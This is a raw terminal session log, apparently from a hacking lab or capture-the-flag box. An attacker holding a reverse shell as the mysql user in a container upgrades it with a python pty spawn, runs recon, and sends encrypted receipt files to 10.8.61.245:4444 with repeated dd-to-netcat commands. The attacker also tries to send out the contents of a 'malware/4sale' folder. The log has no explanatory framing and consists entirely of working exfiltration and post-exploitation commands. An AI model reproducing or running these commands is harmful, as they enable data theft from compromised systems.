@@ -1,0 +1,210 @@
+Script started on 2025-03-19 19:51:00+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 6211
+/usr/bin/sh: 0: can't access tty; job control turned off
+$ [K$ [K[?2004h$ python3 -c 'import pty;[[Kpty.spawn("/bin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[C[C[?2004l[C[C[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[Kmysql@1ad1ce08e714:/var/lib/mysql$ [Kmysql@1ad1ce08e714:/var/lib/mysql$ [K[?2004hmysql@1ad1ce08e714:/var/lib/mysql$ cd /home[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /home
+[Kcd /home[Kcd /home[Kcd /home
+mysql@1ad1ce08e714:/home$ [Kmysql@1ad1ce08e714:/home$ [K[?2004hmysql@1ad1ce08e714:/home$ ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 20
+drwxr-xr-x 1 root  root  4096 Apr  5  2024 .
+drwxr-xr-x 1 root  root  4096 Apr  5  2024 ..
+drwxr-xr-x 3 mysql mysql 4096 Mar 19 16:50 mysql
+drwxrwxr-x 3 root  root  4096 Apr  9  2024 products
+drwxr-xr-x 2 root  root  4096 Apr  4  2024 receipts
+mysql@1ad1ce08e714:/home$ [Kmysql@1ad1ce08e714:/home$ [K[?2004hmysql@1ad1ce08e714:/home$ cd receipts[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd receipts
+[Kcd receipts[Kcd receipts[Kcd receipts
+mysql@1ad1ce08e714:/home/receipts$ [Kmysql@1ad1ce08e714:/home/receipts$ [K[?2004hmysql@1ad1ce08e714:/home/receipts$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[K2999992.txt.gpg  2999995.txt.gpg  2999998.txt.gpg
+2999993.txt.gpg  2999996.txt.gpg  2999999.txt.gpg
+2999994.txt.gpg  2999997.txt.gpg  3000000.txt.gpg
+mysql@1ad1ce08e714:/home/receipts$ [Kmysql@1ad1ce08e714:/home/receipts$ [K[?2004hmysql@1ad1ce08e714:/home/receipts$ whioc[K[Kch wget[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhich wget
+[Kwhich wget[Kwhich wget[Kwhich wget
+mysql@1ad1ce08e714:/home/receipts$ [Kmysql@1ad1ce08e714:/home/receipts$ [K[?2004hmysql@1ad1ce08e714:/home/receipts$ which zip[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhich zip
+[Kwhich zip[Kwhich zip[Kwhich zip
+mysql@1ad1ce08e714:/home/receipts$ [Kmysql@1ad1ce08e714:/home/receipts$ [K[?2004hmysql@1ad1ce08e714:/home/receipts$ /tmp [K/[K[K[K[K[Kdd[K[Kwhich dd[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhich dd
+[Kwhich dd[Kwhich dd[Kwhich dd
+/usr/bin/dd
+mysql@1ad1ce08e714:/home/receipts$ [Kmysql@1ad1ce08e714:/home/receipts$ [K[?2004hmysql@1ad1ce08e714:/home/receipts$ dd if=[7m3000000.txt.gpg[27m3000000.txt.gpg stau[Ktus=rp[K[Kproig[K[Kgress | /tmp/nmc[K[Kc 10.8.61.245 4444[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdd if=3000000.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444
+[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444
+1+1 records in
+1+1 records out
+659 bytes copied, 0.000831582 s, 792 kB/s
+[Kmysql@1ad1ce08e714:/home/receipts$ [Kmysql@1ad1ce08e714:/home/receipts$ [K[?2004hmysql@1ad1ce08e714:/home/receipts$ [7mdd if=2999992.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdd if=2999992.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444
+[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444
+1+1 records in
+1+1 records out
+614 bytes copied, 0.000989871 s, 620 kB/s
+[Kmysql@1ad1ce08e714:/home/receipts$ [Kmysql@1ad1ce08e714:/home/receipts$ [K[?2004hmysql@1ad1ce08e714:/home/receipts$ ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 44
+drwxr-xr-x 2 root root 4096 Apr  4  2024 .
+drwxr-xr-x 1 root root 4096 Apr  5  2024 ..
+-rw-r--r-- 1 root root  614 Apr  4  2024 2999992.txt.gpg
+-rw-r--r-- 1 root root  618 Apr  4  2024 2999993.txt.gpg
+-rw-r--r-- 1 root root  618 Apr  4  2024 2999994.txt.gpg
+-rw-r--r-- 1 root root  618 Apr  4  2024 2999995.txt.gpg
+-rw-r--r-- 1 root root  618 Apr  4  2024 2999996.txt.gpg
+-rw-r--r-- 1 root root  614 Apr  4  2024 2999997.txt.gpg
+-rw-r--r-- 1 root root  614 Apr  4  2024 2999998.txt.gpg
+-rw-r--r-- 1 root root  614 Apr  4  2024 2999999.txt.gpg
+-rw-r--r-- 1 root root  659 Apr  4  2024 3000000.txt.gpg
+mysql@1ad1ce08e714:/home/receipts$ [Kmysql@1ad1ce08e714:/home/receipts$ [K[?2004hmysql@1ad1ce08e714:/home/receipts$ [7mdd if=2999993.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdd if=2999993.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444
+[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444
+1+1 records in
+1+1 records out
+618 bytes copied, 0.0010132 s, 610 kB/s
+[Kmysql@1ad1ce08e714:/home/receipts$ [Kmysql@1ad1ce08e714:/home/receipts$ [K.txt.gpg[?2004hmysql@1ad1ce08e714:/home/receipts$ [7mdd if=2999994.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdd if=2999994.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444
+[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444
+1+1 records in
+1+1 records out
+618 bytes copied, 0.000707211 s, 874 kB/s
+[Kmysql@1ad1ce08e714:/home/receipts$ [Kmysql@1ad1ce08e714:/home/receipts$ [K[?2004hmysql@1ad1ce08e714:/home/receipts$ [7mdd if=2999995.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdd if=2999995.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444
+[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444
+1+1 records in
+1+1 records out
+618 bytes copied, 0.000956321 s, 646 kB/s
+[Kmysql@1ad1ce08e714:/home/receipts$ [Kmysql@1ad1ce08e714:/home/receipts$ [K[?2004hmysql@1ad1ce08e714:/home/receipts$ [7mdd if=2999996.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdd if=2999996.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444
+[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444
+1+1 records in
+1+1 records out
+618 bytes copied, 0.00070332 s, 879 kB/s
+[Kmysql@1ad1ce08e714:/home/receipts$ [Kmysql@1ad1ce08e714:/home/receipts$ [K[?2004hmysql@1ad1ce08e714:/home/receipts$ [7mdd if=2999997.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdd if=2999997.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444
+[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444
+1+1 records in
+1+1 records out
+614 bytes copied, 0.00147189 s, 417 kB/s
+[Kmysql@1ad1ce08e714:/home/receipts$ [Kmysql@1ad1ce08e714:/home/receipts$ [K[?2004hmysql@1ad1ce08e714:/home/receipts$ [7mdd if=2999998.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdd if=2999998.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444
+[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444
+1+1 records in
+1+1 records out
+614 bytes copied, 0.00130907 s, 469 kB/s
+[Kmysql@1ad1ce08e714:/home/receipts$ [Kmysql@1ad1ce08e714:/home/receipts$ [K[?2004hmysql@1ad1ce08e714:/home/receipts$ [7mdd if=2999999.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdd if=2999999.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444
+[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444[K<.txt.gpg status=progress | /tmp/nc 10.8.61.245 4444
+1+1 records in
+1+1 records out
+614 bytes copied, 0.000678848 s, 904 kB/s
+[K[K[?2004h        [K[?2004lmysql@1ad1ce08e714:/home/receipts$ [K[?2004hmysql@1ad1ce08e714:/home/receipts$      [Kuname -r[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004huname -r
+[Kuname -r[Kuname -r[Kuname -r
+6.5.0-1016-aws
+mysql@1ad1ce08e714:/home/receipts$ [Kmysql@1ad1ce08e714:/home/receipts$ [K[?2004hmysql@1ad1ce08e714:/home/receipts$ uname -a[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004huname -a
+[Kuname -a[Kuname -a[Kuname -a
+Linux 1ad1ce08e714 6.5.0-1016-aws #16~22.04.1-Ubuntu SMP Wed Mar 13 18:54:49 UTC 2024 x86_64 GNU/Linux
+mysql@1ad1ce08e714:/home/receipts$ [Kmysql@1ad1ce08e714:/home/receipts$ [K[?2004hmysql@1ad1ce08e714:/home/receipts$ id[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hid
+[Kid[Kid[Kid
+uid=999(mysql) gid=999(mysql) groups=999(mysql)
+mysql@1ad1ce08e714:/home/receipts$ [Kmysql@1ad1ce08e714:/home/receipts$ [K[?2004hmysql@1ad1ce08e714:/home/receipts$ cd [7m/home/products/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P/home/products/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C[K[K[K[K[K[K[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /home/products/malware/4sale/pal4t1n3/MisterMeist3r
+[K</home/products/malware/4sale/pal4t1n3/MisterMeist3r[K</home/products/malware/4sale/pal4t1n3/MisterMeist3r[K</home/products/malware/4sale/pal4t1n3/MisterMeist3r
+mysql@1ad1ce08e714:/home/products/malware/4sale/pal4t1n3/MisterMeist3r$ [Kmysql@1ad1ce08e714:/home/products/malware/4sale/pal4t1n3/MisterMeist3r$ [K[?2004hmysql@1ad1ce08e714:/home/products/malware/4sale/pal4t1n3/MisterMeist3r$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+2DC6C0
+mysql@1ad1ce08e714:/home/products/malware/4sale/pal4t1n3/MisterMeist3r$ [Kmysql@1ad1ce08e714:/home/products/malware/4sale/pal4t1n3/MisterMeist3r$ [Kmp/nc 10[?2004hmysql@1ad1ce08e714:/home/products/malware/4sale/pal4t1n3/MisterMeist3r$ [7mdd if=2DC6C0 status=progress | /[27m[7mt[27m[7mmp/nc 10.8.61.245 4444[27m[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hdd if=2DC6C0 status=progress | /tmp/nc 10.8.61.245 4444
+[K<f=2DC6C0 status=progress | /tmp/nc 10.8.61.245 4444                    [K<f=2DC6C0 status=progress | /tmp/nc 10.8.61.245 4444[K<f=2DC6C0 status=progress | /tmp/nc 10.8.61.245 4444                    
+dd: error reading '2DC6C0': Is a directory
+0+0 records in
+0+0 records out
+0 bytes copied, 0.000282336 s, 0.0 kB/s
+[Kmysql@1ad1ce08e714:/home/products/malware/4sale/pal4t1n3/MisterMeist3r$ [Kmysql@1ad1ce08e714:/home/products/malware/4sale/pal4t1n3/MisterMeist3r$ [K[?2004hmysql@1ad1ce08e714:/home/products/malware/4sale/pal4t1n3/MisterMeist3r$ ls -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -l
+[Kls -l[Kls -l[Kls -l
+total 4
+drwxr-xr-x 2 root root 4096 Apr  9  2024 2DC6C0
+mysql@1ad1ce08e714:/home/products/malware/4sale/pal4t1n3/MisterMeist3r$ [Kmysql@1ad1ce08e714:/home/products/malware/4sale/pal4t1n3/MisterMeist3r$ [K[?2004hmysql@1ad1ce08e714:/home/products/malware/4sale/pal4t1n3/MisterMeist3r$ cd [7m2DC6C0[27m[7mcd [27m2DC6C0[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd 2DC6C0
+[K<cts/malware/4sale/pal4t1n3/MisterMeist3r$ cd 2DC6C0                    [K<cts/malware/4sale/pal4t1n3/MisterMeist3r$ cd 2DC6C0[K<cts/malware/4sale/pal4t1n3/MisterMeist3r$ cd 2DC6C0                    
+<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K[?2004h<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+build.sh  config.ini  mmmbar.nim  readme.txt
+<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K[?2004h<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [7mtar -cf - 2DC6C0 | dd if=2DC6C0 status=progress | /t[27m[7mm[27m[7mp/nc 10.8.61.245 4444[27m[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004htar -cf - 2DC6C0 | dd if=2DC6C0 status=progress | /tmp/nc 10.8.61.245 4444
+[K<f=2DC6C0 status=progress | /tmp/nc 10.8.61.245 4444[K<f=2DC6C0 status=progress | /tmp/nc 10.8.61.245 4444[K<f=2DC6C0 status=progress | /tmp/nc 10.8.61.245 4444
+dd: failed to open '2DC6C0': No such file or directory
+tar: 2DC6C0: Cannot stat: No such file or directory
+tar: -: Cannot write: Broken pipe
+tar: Error is not recoverable: exiting now
+[K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K[?2004h<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ whic pv[K[K[Kh pv[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhich pv
+[Kwhich pv[Kwhich pv[Kwhich pv
+<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K[?2004h<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [7mtar -cf - 2DC6C0 | dd of=/tmp/nc status=progress | /[27m[7mt[27m[7mmp/nc 10.8.61.245 4444[27m[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004htar -cf - 2DC6C0 | dd of=/tmp/nc status=progress | /tmp/nc 10.8.61.245 4444
+[K<=/tmp/nc status=progress | /tmp/nc 10.8.61.245 4444[K<=/tmp/nc status=progress | /tmp/nc 10.8.61.245 4444[K<=/tmp/nc status=progress | /tmp/nc 10.8.61.245 4444
+dd: failed to open '/tmp/nc': Text file busy
+tar: 2DC6C0: Cannot stat: No such file or directory
+tar: -: Cannot write: Broken pipe
+tar: Error is not recoverable: exiting now
+[K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K[?2004h<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+build.sh  config.ini  mmmbar.nim  readme.txt
+<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K[?2004h<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ cd ..[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ..
+[Kcd ..[Kcd ..[Kcd ..
+mysql@1ad1ce08e714:/home/products/malware/4sale/pal4t1n3/MisterMeist3r$ [Kmysql@1ad1ce08e714:/home/products/malware/4sale/pal4t1n3/MisterMeist3r$ [K[?2004hmysql@1ad1ce08e714:/home/products/malware/4sale/pal4t1n3/MisterMeist3r$ [7mtar -cf - 2DC6C0 | dd of=/tmp/nc[27m[7m [27m[7mstatus=progress | /tmp/nc 10.8.61.245 4444[27m[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004htar -cf - 2DC6C0 | dd of=/tmp/nc status=progress | /tmp/nc 10.8.61.245 4444
+[K<=/tmp/nc status=progress | /tmp/nc 10.8.61.245 4444                    [K<=/tmp/nc status=progress | /tmp/nc 10.8.61.245 4444[K<=/tmp/nc status=progress | /tmp/nc 10.8.61.245 4444                    
+dd: failed to open '/tmp/nc': Text file busy
+tar: -: Cannot write: Broken pipe
+tar: Error is not recoverable: exiting now
+[Kmysql@1ad1ce08e714:/home/products/malware/4sale/pal4t1n3/MisterMeist3r$ [Kmysql@1ad1ce08e714:/home/products/malware/4sale/pal4t1n3/MisterMeist3r$ [K[?2004hmysql@1ad1ce08e714:/home/products/malware/4sale/pal4t1n3/MisterMeist3r$ cd      [K-[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd -
+[Kcd -[Kcd -[Kcd -
+/home/products/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0
+<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K[?2004h<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+build.sh  config.ini  mmmbar.nim  readme.txt
+<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K[?2004h<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ nc -[K[K[K[K[7mdd if=build.sh status=progress | /tmp/nc 10.8.61.245[27m[7m [27m[7m4444[27m[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hdd if=build.sh status=progress | /tmp/nc 10.8.61.245 4444
+[K<build.sh status=progress | /tmp/nc 10.8.61.245 4444[K<build.sh status=progress | /tmp/nc 10.8.61.245 4444[K<build.sh status=progress | /tmp/nc 10.8.61.245 4444
+0+1 records in
+0+1 records out
+125 bytes copied, 0.00024054 s, 520 kB/s
+[K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K[?2004h<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ ls -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -l
+[Kls -l[Kls -l[Kls -l
+total 16
+-rwxrwxr-x 1 root root  125 Apr  9  2024 build.sh
+-rw-rw-rw- 1 root root   12 Apr 10  2024 config.ini
+-rw-rw-r-- 1 root root 2397 Apr  9  2024 mmmbar.nim
+-rw-r--r-- 1 root root  259 Apr  9  2024 readme.txt
